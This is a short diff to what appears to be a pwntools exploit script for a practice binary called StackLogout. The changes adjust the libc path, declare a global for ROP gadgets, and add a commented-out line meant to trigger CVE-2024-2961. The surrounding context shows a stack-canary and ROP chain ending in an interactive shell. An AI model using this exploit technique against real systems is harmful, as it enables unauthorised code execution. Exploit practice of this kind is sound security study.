@@ -6,6 +6,7 @@ EXE = './docker/StackLogout'
 
 def payload(lo: int):
     global sh
+    global gadgets
     if lo:
         if lo & 2:
             sh = remote('127.0.0.1', 3073)
@@ -14,7 +15,7 @@ def payload(lo: int):
             sh = remote('127.0.0.1', 2049)
     else:
         sh = remote('', 9999)
-    libc = ELF('./lib/libc.so.6')
+    libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.39-0ubuntu8_amd64/libc.so.6')
 
     def logout(buf: bytes, confirm: bool, go_on: bool, buf2: bytes=b'') -> bytes:
         sh.sendafter(b'user', buf)
@@ -51,6 +52,7 @@ def payload(lo: int):
              # _exit(0)
              gadgets.rdi.address, 0, libc.symbols['_exit'],
              0x48, canary, stack - 8))
+    # logout(b'Trigger CVE-2024-2961!!'.ljust(0x24) + '湿湿湿䂚'.encode(), False, False,
 
     sh.clean()
     sh.interactive()
